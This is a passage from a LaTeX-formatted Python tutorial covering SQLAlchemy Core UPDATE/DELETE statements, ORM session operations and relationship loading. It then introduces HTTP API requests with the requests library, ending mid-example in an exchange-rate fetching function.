\BuiltInTok{print}\NormalTok{(stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
DELETE FROM user_account WHERE user_account.name = :name_1
\end{verbatim}

\subsection{Advanced DELETE
Techniques}\label{advanced-delete-techniques}

\subsubsection{Multiple Table Deletes}\label{multiple-table-deletes}

Like \texttt{Update}, \texttt{Delete} supports correlated subqueries and
backend-specific multiple table syntaxes, such as
\texttt{DELETE\ FROM..USING} on MySQL:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{delete\_stmt }\OperatorTok{=}\NormalTok{ (}
\NormalTok{    delete(user\_table)}
\NormalTok{    .where(user\_table.c.}\BuiltInTok{id} \OperatorTok{==}\NormalTok{ address\_table.c.user\_id)}
\NormalTok{    .where(address\_table.c.email\_address }\OperatorTok{==} \StringTok{"patrick@aol.com"}\NormalTok{)}
\NormalTok{)}
\ImportTok{from}\NormalTok{ sqlalchemy.dialects }\ImportTok{import}\NormalTok{ mysql}
\BuiltInTok{print}\NormalTok{(delete\_stmt.}\BuiltInTok{compile}\NormalTok{(dialect}\OperatorTok{=}\NormalTok{mysql.dialect()))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
DELETE FROM user_account USING user_account, address
WHERE user_account.id = address.user_id AND address.email_address = %s
\end{verbatim}

\subsection{Getting Affected Row Count from UPDATE,
DELETE}\label{getting-affected-row-count-from-update-delete}

Both \texttt{Update} and \texttt{Delete} support retrieving the number
of rows matched after execution via the \texttt{CursorResult.rowcount}
attribute:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.begin() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(}
\NormalTok{        update(user\_table)}
\NormalTok{        .values(fullname}\OperatorTok{=}\StringTok{"Patrick McStar"}\NormalTok{)}
\NormalTok{        .where(user\_table.c.name }\OperatorTok{==} \StringTok{"patrick"}\NormalTok{)}
\NormalTok{    )}
    \BuiltInTok{print}\NormalTok{(result.rowcount)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
BEGIN (implicit)
UPDATE user_account SET fullname=? WHERE user_account.name = ?
[...] ('Patrick McStar', 'patrick')
1
COMMIT
\end{verbatim}

\subsection{Using RETURNING with UPDATE,
DELETE}\label{using-returning-with-update-delete}

The \texttt{RETURNING} clause can be added using
\texttt{Update.returning()} and \texttt{Delete.returning()} methods:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{update\_stmt }\OperatorTok{=}\NormalTok{ (}
\NormalTok{    update(user\_table)}
\NormalTok{    .where(user\_table.c.name }\OperatorTok{==} \StringTok{"patrick"}\NormalTok{)}
\NormalTok{    .values(fullname}\OperatorTok{=}\StringTok{"Patrick the Star"}\NormalTok{)}
\NormalTok{    .returning(user\_table.c.}\BuiltInTok{id}\NormalTok{, user\_table.c.name)}
\NormalTok{)}
\BuiltInTok{print}\NormalTok{(update\_stmt)}

\NormalTok{delete\_stmt }\OperatorTok{=}\NormalTok{ (}
\NormalTok{    delete(user\_table)}
\NormalTok{    .where(user\_table.c.name }\OperatorTok{==} \StringTok{"patrick"}\NormalTok{)}
\NormalTok{    .returning(user\_table.c.}\BuiltInTok{id}\NormalTok{, user\_table.c.name)}
\NormalTok{)}
\BuiltInTok{print}\NormalTok{(delete\_stmt)}
\end{Highlighting}
\end{Shaded}

Output for \texttt{update\_stmt}:

\begin{verbatim}
UPDATE user_account SET fullname=:fullname
WHERE user_account.name = :name_1
RETURNING user_account.id, user_account.name
\end{verbatim}

Output for \texttt{delete\_stmt}:

\begin{verbatim}
DELETE FROM user_account
WHERE user_account.name = :name_1
RETURNING user_account.id, user_account.name
\end{verbatim}

\subsection{Further Reading for UPDATE,
DELETE}\label{further-reading-for-update-delete}

See also:

\begin{itemize}
\tightlist
\item
  \href{https://docs.sqlalchemy.org/en/14/core/dml.html\#sqlalchemy.sql.expression.Update}{Update}
\item
  \href{https://docs.sqlalchemy.org/en/14/core/dml.html\#sqlalchemy.sql.expression.Delete}{Delete}
\item
  \href{https://docs.sqlalchemy.org/en/14/orm/query.html\#orm-enabled-insert-update-and-delete}{ORM-Enabled
  INSERT, UPDATE, and DELETE Statements}
\end{itemize}

Understanding these constructs is crucial for modifying and deleting
data efficiently in your SQLAlchemy applications.

\bookmarksetup{startatroot}

\chapter{Data Manipulation with the ORM in
SQLAlchemy}\label{data-manipulation-with-the-orm-in-sqlalchemy}

This tutorial will guide you through data manipulation using the ORM
(Object-Relational Mapping) approach in SQLAlchemy. The ORM focuses on
the lifecycle of the \texttt{Session} and how it interacts with data
manipulation constructs.

\section{Prerequisites}\label{prerequisites-1}

Before diving into this section, make sure you have gone through the
following:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Executing with an ORM Session}: Introduces creating an ORM
  \texttt{Session} object.
\item
  \textbf{Using ORM Declarative Forms to Define Table Metadata}: Sets up
  ORM mappings for entities like \texttt{User} and \texttt{Address}.
\item
  \textbf{Selecting ORM Entities and Columns}: Examples on running
  \texttt{SELECT} statements for ORM entities.
\end{enumerate}

\section{Inserting Rows Using the ORM Unit of Work
Pattern}\label{inserting-rows-using-the-orm-unit-of-work-pattern}

\subsection{Instances of Classes Represent
Rows}\label{instances-of-classes-represent-rows}

In the ORM, instances of your classes (e.g., \texttt{User},
\texttt{Address}) represent rows in the database. Here's how to create
new instances of \texttt{User}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{squidward }\OperatorTok{=}\NormalTok{ User(name}\OperatorTok{=}\StringTok{"squidward"}\NormalTok{, fullname}\OperatorTok{=}\StringTok{"Squidward Tentacles"}\NormalTok{)}
\NormalTok{krabs }\OperatorTok{=}\NormalTok{ User(name}\OperatorTok{=}\StringTok{"ehkrabs"}\NormalTok{, fullname}\OperatorTok{=}\StringTok{"Eugene H. Krabs"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

These objects are in a transient state, meaning they are not yet
associated with any database.

\subsection{Adding Objects to a
Session}\label{adding-objects-to-a-session}

To add these objects to the database, you must add them to a
\texttt{Session}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{session }\OperatorTok{=}\NormalTok{ Session(engine)}

\NormalTok{session.add(squidward)}
\NormalTok{session.add(krabs)}

\BuiltInTok{print}\NormalTok{(session.new)}
\CommentTok{\# IdentitySet([User(id=None, name=\textquotesingle{}squidward\textquotesingle{}, fullname=\textquotesingle{}Squidward Tentacles\textquotesingle{}), User(id=None, name=\textquotesingle{}ehkrabs\textquotesingle{}, fullname=\textquotesingle{}Eugene H. Krabs\textquotesingle{})])}
\end{Highlighting}
\end{Shaded}

\subsection{Flushing}\label{flushing}

The \texttt{Session} uses a pattern called unit of work to accumulate
changes and then push them to the database. You can manually flush the
session to see the pending SQL statements:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{session.flush()}
\CommentTok{\# Output will show the INSERT statements}
\end{Highlighting}
\end{Shaded}

\subsection{Autogenerated Primary Key
Attributes}\label{autogenerated-primary-key-attributes}

Once the rows are inserted, the ORM retrieves the new primary key
identifiers for each object:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(squidward.}\BuiltInTok{id}\NormalTok{)  }\CommentTok{\# e.g., 4}
\BuiltInTok{print}\NormalTok{(krabs.}\BuiltInTok{id}\NormalTok{)  }\CommentTok{\# e.g., 5}
\end{Highlighting}
\end{Shaded}

\subsection{Committing}\label{committing}

Commit the transaction to make the changes permanent:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{session.commit()}
\end{Highlighting}
\end{Shaded}

\section{Updating ORM Objects Using the Unit of Work
Pattern}\label{updating-orm-objects-using-the-unit-of-work-pattern}

To update objects, load them into a transaction, modify their
attributes, and let the \texttt{Session} handle the update during a
flush:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{sandy }\OperatorTok{=}\NormalTok{ session.execute(select(User).filter\_by(name}\OperatorTok{=}\StringTok{"sandy"}\NormalTok{)).scalar\_one()}

\NormalTok{sandy.fullname }\OperatorTok{=} \StringTok{"Sandy Squirrel"}

\BuiltInTok{print}\NormalTok{(sandy }\KeywordTok{in}\NormalTok{ session.dirty)  }\CommentTok{\# True}

\NormalTok{sandy\_fullname }\OperatorTok{=}\NormalTok{ session.execute(select(User.fullname).where(User.}\BuiltInTok{id} \OperatorTok{==} \DecValTok{2}\NormalTok{)).scalar\_one()}
\BuiltInTok{print}\NormalTok{(sandy\_fullname)  }\CommentTok{\# "Sandy Squirrel"}

\BuiltInTok{print}\NormalTok{(sandy }\KeywordTok{in}\NormalTok{ session.dirty)  }\CommentTok{\# False}
\end{Highlighting}
\end{Shaded}

\section{Deleting ORM Objects Using the Unit of Work
Pattern}\label{deleting-orm-objects-using-the-unit-of-work-pattern}

To delete objects, mark them for deletion and let the \texttt{Session}
handle the delete during a flush:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{patrick }\OperatorTok{=}\NormalTok{ session.get(User, }\DecValTok{3}\NormalTok{)}

\NormalTok{session.delete(patrick)}

\NormalTok{session.execute(select(User).where(User.name }\OperatorTok{==} \StringTok{"patrick"}\NormalTok{)).first()}
\CommentTok{\# Output will show the DELETE statement}
\end{Highlighting}
\end{Shaded}

\subsection{Rolling Back}\label{rolling-back}

Rollback the transaction to undo the changes:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{session.rollback()}
\end{Highlighting}
\end{Shaded}

\subsection{Closing a Session}\label{closing-a-session}

Close the session to release resources and detach objects:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{session.close()}
\end{Highlighting}
\end{Shaded}

\section{Bulk / Multi-Row INSERT, UPSERT, UPDATE, and
DELETE}\label{bulk-multi-row-insert-upsert-update-and-delete}

For performance-intensive tasks involving large numbers of rows, use
bulk operations. This mode is crucial when dealing with massive datasets
without needing to construct and manipulate individual ORM objects.

See the
\href{https://docs.sqlalchemy.org/en/14/orm/query.html\#orm-enabled-insert-update-and-delete}{ORM-Enabled
INSERT, UPDATE, and DELETE Statements} in the ORM Querying Guide for
more details.

\section{Conclusion}\label{conclusion-22}

Understanding the \texttt{Session} and its unit of work pattern is
crucial for efficient data manipulation with SQLAlchemy's ORM. Use the
techniques discussed to manage the lifecycle of your objects and perform
CRUD operations seamlessly.

For further reading:

\begin{itemize}
\tightlist
\item
  \href{https://docs.sqlalchemy.org/en/14/core/dml.html\#sqlalchemy.sql.expression.Update}{Update}
\item
  \href{https://docs.sqlalchemy.org/en/14/core/dml.html\#sqlalchemy.sql.expression.Delete}{Delete}
\item
  \href{https://docs.sqlalchemy.org/en/14/orm/query.html\#orm-enabled-insert-update-and-delete}{ORM-Enabled
  INSERT, UPDATE, and DELETE Statements}
\end{itemize}

These resources will help you dive deeper into the capabilities and best
practices of using SQLAlchemy's ORM for data manipulation.

\bookmarksetup{startatroot}

\chapter{Working with ORM Related Objects with
SQLAlchemy}\label{working-with-orm-related-objects-with-sqlalchemy}

In this section, we'll explore how SQLAlchemy's ORM handles
relationships between mapped classes. Relationships are defined using
the \texttt{relationship()} construct, allowing us to create
associations between different classes or even within the same class
(self-referential relationships). This tutorial will cover creating,
persisting, loading, and querying related objects using the ORM.

\section{Declaring Relationships}\label{declaring-relationships}

\subsection{Basic Relationship
Example}\label{basic-relationship-example}

Let's start with a simple example of declaring relationships between two
classes: \texttt{User} and \texttt{Address}.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy.orm }\ImportTok{import}\NormalTok{ Mapped}
\ImportTok{from}\NormalTok{ sqlalchemy.orm }\ImportTok{import}\NormalTok{ relationship}
\ImportTok{from}\NormalTok{ sqlalchemy.ext.declarative }\ImportTok{import}\NormalTok{ declarative\_base}

\NormalTok{Base }\OperatorTok{=}\NormalTok{ declarative\_base()}

\KeywordTok{class}\NormalTok{ User(Base):}
\NormalTok{    \_\_tablename\_\_ }\OperatorTok{=} \StringTok{"user\_account"}

    \BuiltInTok{id} \OperatorTok{=}\NormalTok{ mapped\_column(Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{    name }\OperatorTok{=}\NormalTok{ mapped\_column(String(}\DecValTok{50}\NormalTok{))}
\NormalTok{    fullname }\OperatorTok{=}\NormalTok{ mapped\_column(String(}\DecValTok{100}\NormalTok{))}
    
\NormalTok{    addresses: Mapped[List[}\StringTok{"Address"}\NormalTok{]] }\OperatorTok{=}\NormalTok{ relationship(back\_populates}\OperatorTok{=}\StringTok{"user"}\NormalTok{)}

\KeywordTok{class}\NormalTok{ Address(Base):}
\NormalTok{    \_\_tablename\_\_ }\OperatorTok{=} \StringTok{"address"}

    \BuiltInTok{id} \OperatorTok{=}\NormalTok{ mapped\_column(Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{    email\_address }\OperatorTok{=}\NormalTok{ mapped\_column(String(}\DecValTok{100}\NormalTok{))}
\NormalTok{    user\_id }\OperatorTok{=}\NormalTok{ mapped\_column(Integer, ForeignKey(}\StringTok{"user\_account.id"}\NormalTok{))}
    
\NormalTok{    user: Mapped[}\StringTok{"User"}\NormalTok{] }\OperatorTok{=}\NormalTok{ relationship(back\_populates}\OperatorTok{=}\StringTok{"addresses"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

In this example, the \texttt{User} class has an \texttt{addresses}
attribute, and the \texttt{Address} class has a \texttt{user} attribute.
The \texttt{relationship()} construct links the two classes, and the
\texttt{back\_populates} parameter ensures bidirectional relationship
management.

\section{Persisting and Loading
Relationships}\label{persisting-and-loading-relationships}

\subsection{Creating and Associating
Objects}\label{creating-and-associating-objects}

Let's create a new \texttt{User} object and associate it with
\texttt{Address} objects:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{u1 }\OperatorTok{=}\NormalTok{ User(name}\OperatorTok{=}\StringTok{"pkrabs"}\NormalTok{, fullname}\OperatorTok{=}\StringTok{"Pearl Krabs"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(u1.addresses)  }\CommentTok{\# Output: []}

\NormalTok{a1 }\OperatorTok{=}\NormalTok{ Address(email\_address}\OperatorTok{=}\StringTok{"pearl.krabs@gmail.com"}\NormalTok{)}
\NormalTok{u1.addresses.append(a1)}
\BuiltInTok{print}\NormalTok{(u1.addresses)  }\CommentTok{\# Output: [Address(id=None, email\_address=\textquotesingle{}pearl.krabs@gmail.com\textquotesingle{})]}

\BuiltInTok{print}\NormalTok{(a1.user)  }\CommentTok{\# Output: User(id=None, name=\textquotesingle{}pkrabs\textquotesingle{}, fullname=\textquotesingle{}Pearl Krabs\textquotesingle{})}
\end{Highlighting}
\end{Shaded}

Adding an \texttt{Address} object to the \texttt{User.addresses}
collection also updates the \texttt{Address.user} attribute
automatically, thanks to the \texttt{back\_populates} parameter.

\subsection{Adding to a Session}\label{adding-to-a-session}

We need to add the objects to a session to persist them in the database:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{session.add(u1)}
\BuiltInTok{print}\NormalTok{(u1 }\KeywordTok{in}\NormalTok{ session)  }\CommentTok{\# Output: True}
\BuiltInTok{print}\NormalTok{(a1 }\KeywordTok{in}\NormalTok{ session)  }\CommentTok{\# Output: True}

\NormalTok{session.commit()}
\end{Highlighting}
\end{Shaded}

After committing the session, the objects are stored in the database,
and primary key values are assigned.

\subsection{Loading Relationships}\label{loading-relationships}

Accessing a relationship attribute triggers a lazy load if the related
objects are not already loaded:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{u1 }\OperatorTok{=}\NormalTok{ session.query(User).filter\_by(name}\OperatorTok{=}\StringTok{"pkrabs"}\NormalTok{).one()}
\BuiltInTok{print}\NormalTok{(u1.addresses)  }\CommentTok{\# Triggers a SELECT statement to load addresses}
\end{Highlighting}
\end{Shaded}

\section{Using Relationships in
Queries}\label{using-relationships-in-queries}

\subsection{Joining Related Tables}\label{joining-related-tables}

You can use relationships to simplify joining related tables:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(Address.email\_address).select\_from(User).join(User.addresses)}
\BuiltInTok{print}\NormalTok{(stmt)}
\CommentTok{\# Output: SELECT address.email\_address FROM user\_account JOIN address ON user\_account.id = address.user\_id}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Using \texttt{joinedload()} and
\texttt{selectinload()}}{Using joinedload() and selectinload()}}\label{using-joinedload-and-selectinload}

These methods help optimize query performance by loading related objects
eagerly:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy.orm }\ImportTok{import}\NormalTok{ selectinload, joinedload}

\CommentTok{\# Using selectinload}
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(User).options(selectinload(User.addresses)).order\_by(User.}\BuiltInTok{id}\NormalTok{)}
\ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ session.execute(stmt):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{row}\SpecialCharTok{.}\NormalTok{User}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{ (}\SpecialCharTok{\{}\StringTok{\textquotesingle{}, \textquotesingle{}}\SpecialCharTok{.}\NormalTok{join(a.email\_address }\ControlFlowTok{for}\NormalTok{ a }\KeywordTok{in}\NormalTok{ row.User.addresses)}\SpecialCharTok{\}}\SpecialStringTok{)"}\NormalTok{)}

\CommentTok{\# Using joinedload}
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(Address).options(joinedload(Address.user)).order\_by(Address.}\BuiltInTok{id}\NormalTok{)}
\ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ session.execute(stmt):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{row}\SpecialCharTok{.}\NormalTok{Address}\SpecialCharTok{.}\NormalTok{email\_address}\SpecialCharTok{\}}\SpecialStringTok{ }\SpecialCharTok{\{}\NormalTok{row}\SpecialCharTok{.}\NormalTok{Address}\SpecialCharTok{.}\NormalTok{user}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Loader Strategies}\label{loader-strategies}

\subsection{Configuring Loader
Strategies}\label{configuring-loader-strategies}

You can set loader strategies at mapping time or query time to control
how related objects are loaded:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# At mapping time}
\KeywordTok{class}\NormalTok{ User(Base):}
\NormalTok{    \_\_tablename\_\_ }\OperatorTok{=} \StringTok{"user\_account"}
\NormalTok{    addresses: Mapped[List[}\StringTok{"Address"}\NormalTok{]] }\OperatorTok{=}\NormalTok{ relationship(back\_populates}\OperatorTok{=}\StringTok{"user"}\NormalTok{, lazy}\OperatorTok{=}\StringTok{"selectin"}\NormalTok{)}

\CommentTok{\# At query time}
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(User).options(selectinload(User.addresses)).order\_by(User.}\BuiltInTok{id}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Using
\texttt{raiseload()}}{Using raiseload()}}\label{using-raiseload}

The \texttt{raiseload()} strategy raises an error when a lazy load is
attempted, preventing unwanted lazy loads:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ User(Base):}
\NormalTok{    \_\_tablename\_\_ }\OperatorTok{=} \StringTok{"user\_account"}
\NormalTok{    addresses: Mapped[List[}\StringTok{"Address"}\NormalTok{]] }\OperatorTok{=}\NormalTok{ relationship(back\_populates}\OperatorTok{=}\StringTok{"user"}\NormalTok{, lazy}\OperatorTok{=}\StringTok{"raise\_on\_sql"}\NormalTok{)}

\NormalTok{u1 }\OperatorTok{=}\NormalTok{ session.query(User).first()}
\NormalTok{u1.addresses  }\CommentTok{\# Raises an InvalidRequestError}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-23}

Understanding and using relationships in SQLAlchemy's ORM allows you to
efficiently manage and query related data. By defining relationships
with \texttt{relationship()}, using the unit of work pattern, and
employing appropriate loader strategies, you can optimize your database
interactions and maintain clean, readable code. For more details, refer
to SQLAlchemy's
\href{https://docs.sqlalchemy.org/en/14/orm/loading_relationships.html}{Relationship
Loading Techniques} documentation.

\bookmarksetup{startatroot}

\chapter{Introduction to API Interactions with
Python}\label{introduction-to-api-interactions-with-python}

APIs (Application Programming Interfaces) allow applications to
communicate with external services and data sources over the web. Python
provides robust libraries for making HTTP requests and handling JSON
data, enabling you to integrate external data and services into your
applications seamlessly. This tutorial will cover making requests to web
APIs and handling responses using Python.

\subsection{Libraries/Tools}\label{librariestools}

\begin{itemize}
\tightlist
\item
  \texttt{requests}: A popular library for making HTTP requests.
\item
  \texttt{json}: A standard library module for handling JSON data.
\end{itemize}

\subsection{\texorpdfstring{Making HTTP Requests with
\texttt{requests}}{Making HTTP Requests with requests}}\label{making-http-requests-with-requests}

The \texttt{requests} library makes it easy to send HTTP requests and
handle responses. First, you need to install the \texttt{requests}
library if you haven't already:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install requests}
\end{Highlighting}
\end{Shaded}

\subsubsection{Basic GET Request}\label{basic-get-request}

A GET request is used to retrieve data from a server.

\paragraph{Example: Fetching Data from a Public
API}\label{example-fetching-data-from-a-public-api}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\CommentTok{\# Define the API endpoint}
\NormalTok{url }\OperatorTok{=} \StringTok{\textquotesingle{}https://api.exchangerate{-}api.com/v4/latest/USD\textquotesingle{}}

\CommentTok{\# Make a GET request to the API}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(url)}

\CommentTok{\# Check the status code of the response}
\ControlFlowTok{if}\NormalTok{ response.status\_code }\OperatorTok{==} \DecValTok{200}\NormalTok{:}
    \CommentTok{\# Parse the JSON data}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ response.json()}
    \BuiltInTok{print}\NormalTok{(data)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Failed to retrieve data: }\SpecialCharTok{\{}\NormalTok{response}\SpecialCharTok{.}\NormalTok{status\_code}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Handling JSON Data}\label{handling-json-data-1}

Most APIs return data in JSON format. The \texttt{json} module in Python
can parse JSON data and convert it into Python objects.

\subsubsection{Example: Parsing JSON
Response}\label{example-parsing-json-response}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}
\ImportTok{import}\NormalTok{ json}

\CommentTok{\# Define the API endpoint}
\NormalTok{url }\OperatorTok{=} \StringTok{\textquotesingle{}https://api.exchangerate{-}api.com/v4/latest/USD\textquotesingle{}}

\CommentTok{\# Make a GET request to the API}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(url)}

\ControlFlowTok{if}\NormalTok{ response.status\_code }\OperatorTok{==} \DecValTok{200}\NormalTok{:}
    \CommentTok{\# Parse the JSON data}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ response.json()}
    \CommentTok{\# Pretty print the JSON data}
    \BuiltInTok{print}\NormalTok{(json.dumps(data, indent}\OperatorTok{=}\DecValTok{4}\NormalTok{))}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Failed to retrieve data: }\SpecialCharTok{\{}\NormalTok{response}\SpecialCharTok{.}\NormalTok{status\_code}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Making POST Requests}\label{making-post-requests}

A POST request is used to send data to a server.

\subsubsection{Example: Sending Data to an
API}\label{example-sending-data-to-an-api}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\CommentTok{\# Define the API endpoint}
\NormalTok{url }\OperatorTok{=} \StringTok{\textquotesingle{}https://jsonplaceholder.typicode.com/posts\textquotesingle{}}

\CommentTok{\# Define the data to be sent}
\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}
    \StringTok{"title"}\NormalTok{: }\StringTok{"foo"}\NormalTok{,}
    \StringTok{"body"}\NormalTok{: }\StringTok{"bar"}\NormalTok{,}
    \StringTok{"userId"}\NormalTok{: }\DecValTok{1}
\NormalTok{\}}

\CommentTok{\# Make a POST request to the API}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.post(url, json}\OperatorTok{=}\NormalTok{data)}

\ControlFlowTok{if}\NormalTok{ response.status\_code }\OperatorTok{==} \DecValTok{201}\NormalTok{:}
    \CommentTok{\# Parse the JSON response}
\NormalTok{    response\_data }\OperatorTok{=}\NormalTok{ response.json()}
    \BuiltInTok{print}\NormalTok{(response\_data)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Failed to send data: }\SpecialCharTok{\{}\NormalTok{response}\SpecialCharTok{.}\NormalTok{status\_code}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Handling API
Authentication}\label{handling-api-authentication}

Some APIs require authentication. The \texttt{requests} library supports
various authentication methods, including API keys and OAuth.

\subsubsection{Example: Using an API
Key}\label{example-using-an-api-key}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\CommentTok{\# Define the API endpoint and your API key}
\NormalTok{url }\OperatorTok{=} \StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}
\NormalTok{api\_key }\OperatorTok{=} \StringTok{\textquotesingle{}your\_api\_key\_here\textquotesingle{}}

\CommentTok{\# Set the headers with the API key}
\NormalTok{headers }\OperatorTok{=}\NormalTok{ \{}
    \StringTok{\textquotesingle{}Authorization\textquotesingle{}}\NormalTok{: }\SpecialStringTok{f\textquotesingle{}Bearer }\SpecialCharTok{\{}\NormalTok{api\_key}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}
\NormalTok{\}}

\CommentTok{\# Make a GET request to the API}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(url, headers}\OperatorTok{=}\NormalTok{headers)}

\ControlFlowTok{if}\NormalTok{ response.status\_code }\OperatorTok{==} \DecValTok{200}\NormalTok{:}
    \CommentTok{\# Parse the JSON data}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ response.json()}
    \BuiltInTok{print}\NormalTok{(data)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Failed to retrieve data: }\SpecialCharTok{\{}\NormalTok{response}\SpecialCharTok{.}\NormalTok{status\_code}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Error Handling}\label{error-handling}

Proper error handling is essential when working with APIs to ensure your
application can gracefully handle unexpected responses.

\subsubsection{Example: Handling Errors in API
Requests}\label{example-handling-errors-in-api-requests}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\CommentTok{\# Define the API endpoint}
\NormalTok{url }\OperatorTok{=} \StringTok{\textquotesingle{}https://api.exchangerate{-}api.com/v4/latest/INVALID\textquotesingle{}}

\CommentTok{\# Make a GET request to the API}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(url)}

\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    response.raise\_for\_status()}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ response.json()}
    \BuiltInTok{print}\NormalTok{(data)}
\ControlFlowTok{except}\NormalTok{ requests.exceptions.HTTPError }\ImportTok{as}\NormalTok{ errh:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"HTTP Error: }\SpecialCharTok{\{}\NormalTok{errh}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\ControlFlowTok{except}\NormalTok{ requests.exceptions.}\PreprocessorTok{ConnectionError} \ImportTok{as}\NormalTok{ errc:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Error Connecting: }\SpecialCharTok{\{}\NormalTok{errc}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\ControlFlowTok{except}\NormalTok{ requests.exceptions.Timeout }\ImportTok{as}\NormalTok{ errt:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Timeout Error: }\SpecialCharTok{\{}\NormalTok{errt}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\ControlFlowTok{except}\NormalTok{ requests.exceptions.RequestException }\ImportTok{as}\NormalTok{ err:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"OOps: Something Else }\SpecialCharTok{\{}\NormalTok{err}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Example: Integrating External Data into Your
Application}\label{example-integrating-external-data-into-your-application}

Let's combine what we've learned to build a small application that
fetches and displays the current exchange rates.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}
\ImportTok{import}\NormalTok{ json}

\KeywordTok{def}\NormalTok{ fetch\_exchange\_rates(base\_currency):}
\NormalTok{    url }\OperatorTok{=} \SpecialStringTok{f\textquotesingle{}https://api.exchangerate{-}api.com/v4/latest/}\SpecialCharTok{\{}\NormalTok{base\_currency}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}
\NormalTok{    response }\OperatorTok{=}\NormalTok{ requests.get(url)}
    
